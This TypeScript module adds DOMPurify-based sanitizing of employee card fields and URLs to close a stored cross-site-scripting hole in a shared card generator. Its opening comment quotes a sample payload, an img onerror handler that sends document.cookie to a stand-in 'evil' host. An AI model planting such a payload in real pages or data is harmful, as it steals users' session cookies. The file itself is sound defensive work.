import DOMPurify from 'dompurify';
import { Employee, CanvasConfig } from '../types';

// Every card generator in emailTemplate.ts builds its markup by interpolating
// employee fields straight into a template string, and the result is handed to
// dangerouslySetInnerHTML (and to html-to-image on export). Nothing escaped or
// filtered those fields, so an employee saved as
//
//     <img src=x onerror="fetch('https://evil/?c='+document.cookie)">
//
// executed in the browser of everyone who opened the app. The records live in
// a shared Supabase table, so that is stored XSS rather than merely self-XSS.
//
// Escaping is not an option for all of it: on the Hiring, Baby and General
// Disclosure templates the name, role and department fields are contenteditable
// on the card itself, so their stored values legitimately contain the markup
// the format toolbar produces (<b>, <i>, inline color spans). Escaping those
// would show people `<b>` as text and break cards that already exist.
//
// So the fields are sanitized rather than escaped: formatting survives,
// anything that can execute does not. DOMPurify does the work -- it already
// ships in this bundle as a jspdf dependency, so declaring it directly adds a
// maintained sanitizer at no extra download.

// What the inline format toolbar can produce, and nothing else. No <a> (the
// cards never render user links), no <img>, no <svg>, no form elements.
const ALLOWED_TAGS = ['b', 'strong', 'i', 'em', 'u', 's', 'span', 'font', 'br', 'div', 'p'];
// `style` carries the colors the toolbar sets. DOMPurify parses and filters the
// declarations itself, dropping expression()/url() style payloads.
const ALLOWED_ATTR = ['style', 'color', 'face'];
// DOMPurify keeps data-* attributes by default. Nothing on a card reads one,
// and pasting from Teams or Word drags in piles of them (data-teams,
// data-ccp-props...), so they are dropped with everything else.
const ALLOW_DATA_ATTR = false;

/**
 * Sanitize a value that is allowed to carry inline formatting markup.
 * Returns '' for nullish input so callers can interpolate the result directly.
 */
export const sanitizeRichText = (value: string | undefined | null): string => {
  if (!value) return '';
  return DOMPurify.sanitize(value, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOW_DATA_ATTR,
    // Keep the text of anything stripped, so a name wrapped in a disallowed
    // tag still shows the name instead of vanishing from the card.
    KEEP_CONTENT: true,
  });
};

/**
 * The readable text of a value that may carry formatting markup.
 *
 * Templates that split a name into first and last cannot do that on markup:
 * `'<span style="...">Emanuel</span>'.split(' ')[0]` is `'<span'`, an
 * unclosed tag that swallows the rest of the card when it is interpolated.
 * That is not hypothetical -- pasting a name from Teams did exactly that.
 * Anywhere a value is sliced rather than rendered whole, it goes through
 * here first; values rendered whole keep their formatting.
 */
export const toPlainText = (value: string | undefined | null): string => {
  if (!value) return '';
  if (!/[<&]/.test(value)) return value; // the common case, untouched
  const doc = new DOMParser().parseFromString(value, 'text/html');
  return (doc.body.textContent || '').replace(/\s+/g, ' ').trim();
};

/**
 * Sanitize a value that is only ever plain text (a date, a tenure label).
 * Markup is removed outright rather than escaped -- these fields have never
 * had a reason to contain any.
 */
export const sanitizePlainText = (value: string | undefined | null): string => {
  if (!value) return '';
  return DOMPurify.sanitize(value, { ALLOWED_TAGS: [], ALLOWED_ATTR: [], KEEP_CONTENT: true });
};

// Schemes that are safe to put in src/href. A stored `javascript:` URL does
// nothing in an <img src>, but these values also reach <a href> in the email
// signature, where it would be one click from executing.
const SAFE_URL = /^(https?:|data:image\/|blob:|mailto:|tel:|\/|#|$)/i;

/**
 * Sanitize a value interpolated into an HTML attribute that holds a URL.
 * Unsafe schemes resolve to '' (a broken image) rather than being rendered.
 */
export const sanitizeUrl = (value: string | undefined | null): string => {
  if (!value) return '';
  const trimmed = String(value).trim();
  if (!SAFE_URL.test(trimmed)) return '';
  // The quote characters are what would let a value break out of the
  // attribute it sits in; & is encoded because an attribute is the one place
  // a bare & is ambiguous, and browsers decode it back for the request.
  return trimmed.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;');
};

// Free-text fields that may legitimately carry formatting markup.
const RICH_FIELDS = ['name', 'role', 'previousRole', 'department', 'description',
  'activationParagraph', 'hiringTitle1', 'hiringTitle2'] as const;

// Free-text fields that are always plain.
const PLAIN_FIELDS = ['dateStr', 'admissionDate', 'tenure', 'birthDate'] as const;

// Fields holding a URL that lands in an attribute.
const URL_FIELDS = ['photoUrl', 'providerLogo', 'providerBgAsset'] as const;

/**
 * Return a copy of an employee with every user-supplied field made safe to
 * interpolate. Called once at the entry point of card generation, so no
 * individual template -- including ones added later -- has to remember to do
 * it, and no template can accidentally skip it.
 */
const applyToFields = <K extends keyof Employee>(
  target: Employee,
  fields: readonly K[],
  clean: (value: string) => string,
): void => {
  for (const field of fields) {
    const current = target[field];
    if (typeof current === 'string') target[field] = clean(current) as Employee[K];
  }
};

export const sanitizeEmployee = (employee: Employee): Employee => {
  const safe: Employee = { ...employee };

  applyToFields(safe, RICH_FIELDS, sanitizeRichText);
  applyToFields(safe, PLAIN_FIELDS, sanitizePlainText);
  applyToFields(safe, URL_FIELDS, sanitizeUrl);

  if (Array.isArray(safe.gameThumbnails)) {
    safe.gameThumbnails = safe.gameThumbnails.map(sanitizeUrl);
  }
  if (safe.socials) {
    const socials = { ...safe.socials };
    for (const key of ['linkedin', 'instagram', 'twitter', 'email', 'phone'] as const) {
      if (typeof socials[key] === 'string') socials[key] = sanitizePlainText(socials[key]);
    }
    if (Array.isArray(socials.skills)) socials.skills = socials.skills.map(sanitizePlainText);
    safe.socials = socials;
  }

  return safe;
};

/** Same treatment for the canvas config, whose logo is interpolated into src. */
export const sanitizeConfig = (config: CanvasConfig): CanvasConfig => ({
  ...config,
  companyLogo: sanitizeUrl(config.companyLogo),
});

/** The signature template renders these as real, clickable <a href> values. */
export const sanitizeLinks = (links?: { [key: string]: string }): { [key: string]: string } => {
  if (!links) return {};
  const safe: { [key: string]: string } = {};
  for (const [key, value] of Object.entries(links)) {
    const url = sanitizeUrl(value);
    if (url) safe[key] = url;
  }
  return safe;
};
